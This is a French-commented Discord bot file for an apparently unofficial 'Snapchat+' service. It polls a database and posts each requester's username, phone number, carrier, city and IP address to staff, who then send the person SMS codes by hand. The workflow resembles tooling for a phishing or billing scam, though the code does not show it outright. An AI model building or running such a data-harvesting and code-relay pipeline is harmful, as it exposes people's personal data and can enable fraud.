import { Client, GatewayIntentBits, EmbedBuilder, ActionRowBuilder, ButtonBuilder, ButtonStyle, SlashCommandBuilder, REST, Routes } from 'discord.js';
import { neon } from '@neondatabase/serverless';

// ─── CONFIG ───
const TOKEN = process.env.DISCORD_BOT_TOKEN;
const CLIENT_ID = process.env.DISCORD_CLIENT_ID;
const GUILD_ID = process.env.DISCORD_GUILD_ID;       // Serveur où les commandes sont déployées
const LOG_CHANNEL_ID = process.env.DISCORD_LOG_CHANNEL_ID;
const DATABASE_URL = process.env.DATABASE_URL;
const STAFF_SECRET = process.env.STAFF_SECRET;
const API_BASE = process.env.API_BASE || 'https://snaptech.vercel.app';

if (!TOKEN || !CLIENT_ID || !DATABASE_URL) {
    console.error('❌ Variables manquantes : DISCORD_BOT_TOKEN, DISCORD_CLIENT_ID, DATABASE_URL');
    process.exit(1);
}

const sql = neon(DATABASE_URL);
const client = new Client({
    intents: [
        GatewayIntentBits.Guilds,
        GatewayIntentBits.GuildMessages,
        GatewayIntentBits.MessageContent
    ]
});

// ─── COMMANDES SLASH ───
const commands = [
    new SlashCommandBuilder()
        .setName('config')
        .setDescription('Configurer le salon de logs')
        .addChannelOption(opt => opt.setName('salon').setDescription('Salon Discord').setRequired(true)),
    new SlashCommandBuilder()
        .setName('panel')
        .setDescription('Afficher le panel staff'),
    new SlashCommandBuilder()
        .setName('claim')
        .setDescription('Prendre en charge une demande')
        .addStringOption(opt => opt.setName('phone').setDescription('Numéro de téléphone').setRequired(true)),
    new SlashCommandBuilder()
        .setName('sendcode')
        .setDescription('Envoyer un code SMS au client')
        .addStringOption(opt => opt.setName('phone').setDescription('Numéro de téléphone').setRequired(true))
        .addStringOption(opt => opt.setName('code').setDescription('Code à 6 chiffres').setRequired(true))
];

// Déployer les commandes
const rest = new REST({ version: '10' }).setToken(TOKEN);
(async () => {
    try {
        console.log('🔄 Déploiement des commandes slash...');
        await rest.put(
            GUILD_ID
                ? Routes.applicationGuildCommands(CLIENT_ID, GUILD_ID)
                : Routes.applicationCommands(CLIENT_ID),
            { body: commands.map(c => c.toJSON()) }
        );
        console.log('✅ Commandes déployées');
    } catch (e) {
        console.error('Erreur déploiement commands:', e);
    }
})();

// ─── EVENTS ───
client.once('ready', () => {
    console.log(`🤖 Bot connecté en tant que ${client.user.tag}`);
    startPolling();
});

// ─── POLLING DB → envoie embeds Discord ───
let lastCheckedId = 0;

async function startPolling() {
    setInterval(async () => {
        try {
            const rows = await sql`
                SELECT id, username, phone, operator, country, city, ip_address, status, created_at
                FROM snap_requests
                WHERE id > ${lastCheckedId} AND status = 'pending'
                ORDER BY id ASC
            `;

            for (const row of rows) {
                lastCheckedId = Math.max(lastCheckedId, row.id);
                await sendNewRequestEmbed(row);
            }
        } catch (e) {
            console.error('Polling error:', e);
        }
    }, 5000);
}

async function sendNewRequestEmbed(row) {
    const channel = client.channels.cache.get(LOG_CHANNEL_ID);
    if (!channel) return;

    const carrierNames = {
        'orange': 'Orange', 'sfr': 'SFR', 'bouygues': 'Bouygues',
        'base': 'BASE', 'orange_be': 'Orange Belgique', 'proximus': 'Proximus', 'telenet': 'Telenet'
    };

    const embed = new EmbedBuilder()
        .setTitle('📱 Nouvelle demande Snapchat+')
        .setColor(0xfffc00)
        .addFields(
            { name: '👤 Username', value: row.username, inline: true },
            { name: '📞 Téléphone', value: row.phone, inline: true },
            { name: '📡 Opérateur', value: carrierNames[row.operator] || row.operator, inline: true },
            { name: '🌍 Pays', value: row.country || 'Inconnu', inline: true },
            { name: '🏙️ Ville', value: row.city || 'Inconnue', inline: true },
            { name: '🌐 IP', value: row.ip_address || 'Inconnue', inline: true },
            { name: '⏰ Date', value: `<t:${Math.floor(new Date(row.created_at).getTime()/1000)}:R>`, inline: false }
        )
        .setFooter({ text: `ID: ${row.id}` })
        .setTimestamp();

    const rowButtons = new ActionRowBuilder().addComponents(
        new ButtonBuilder()
            .setCustomId(`claim_${row.phone}`)
            .setLabel('📋 Prendre en charge')
            .setStyle(ButtonStyle.Primary),
        new ButtonBuilder()
            .setCustomId(`sendcode_${row.phone}`)
            .setLabel('📩 Envoyer un code')
            .setStyle(ButtonStyle.Success)
    );

    await channel.send({ embeds: [embed], components: [rowButtons] });
}

// ─── INTERACTIONS BOUTONS ───
client.on('interactionCreate', async interaction => {
    if (!interaction.isButton()) return;

    const [action, phone] = interaction.customId.split('_');

    if (action === 'claim') {
        await interaction.deferReply({ ephemeral: true });

        try {
            const res = await fetch(`${API_BASE}/api/staff-action`, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ action: 'claim', phone, secret: STAFF_SECRET })
            });
            const data = await res.json();

            if (data.success) {
                await interaction.editReply({
                    content: `✅ Demande **${phone}** prise en charge !\n\nEnvoyez maintenant le code SMS avec :\n\`/sendcode phone:${phone} code:123456\``
                });

                // Mettre à jour le message original
                const originalEmbed = EmbedBuilder.from(interaction.message.embeds[0])
                    .setColor(0x3b82f6)
                    .setTitle('📱 Demande en cours de traitement')
                    .setDescription(`👤 Pris en charge par <@${interaction.user.id}>`);

                await interaction.message.edit({ embeds: [originalEmbed], components: [] });
            } else {
                await interaction.editReply({ content: `❌ Erreur: ${data.message}` });
            }
        } catch (e) {
            await interaction.editReply({ content: '❌ Erreur réseau' });
        }
    }

    if (action === 'sendcode') {
        await interaction.deferReply({ ephemeral: true });
        await interaction.editReply({
            content: `📩 Utilisez la commande slash :\n\`/sendcode phone:${phone} code:123456\``
        });
    }
});

// ─── COMMANDES SLASH HANDLERS ───
client.on('interactionCreate', async interaction => {
    if (!interaction.isChatInputCommand()) return;

    if (interaction.commandName === 'config') {
        const salon = interaction.options.getChannel('salon');
        process.env.DISCORD_LOG_CHANNEL_ID = salon.id;
        await interaction.reply({ content: `✅ Salon de logs configuré : <#${salon.id}>`, ephemeral: true });
    }

    if (interaction.commandName === 'panel') {
        const embed = new EmbedBuilder()
            .setTitle('🎛️ Panel Staff Snaptech')
            .setDescription('Les nouvelles demandes apparaissent automatiquement ici.')
            .setColor(0x000000);
        await interaction.reply({ embeds: [embed] });
    }

    if (interaction.commandName === 'claim') {
        const phone = interaction.options.getString('phone');
        await interaction.deferReply();

        try {
            const res = await fetch(`${API_BASE}/api/staff-action`, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ action: 'claim', phone, secret: STAFF_SECRET })
            });
            const data = await res.json();
            await interaction.editReply({ content: data.success ? `✅ ${data.message}` : `❌ ${data.message}` });
        } catch (e) {
            await interaction.editReply({ content: '❌ Erreur' });
        }
    }

    if (interaction.commandName === 'sendcode') {
        const phone = interaction.options.getString('phone');
        const code = interaction.options.getString('code');
        await interaction.deferReply();

        try {
            const res = await fetch(`${API_BASE}/api/staff-action`, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ action: 'send_code', phone, code, secret: STAFF_SECRET })
            });
            const data = await res.json();
            await interaction.editReply({ content: data.success ? `✅ Code envoyé au client !` : `❌ ${data.message}` });
        } catch (e) {
            await interaction.editReply({ content: '❌ Erreur' });
        }
    }
});

client.login(TOKEN);
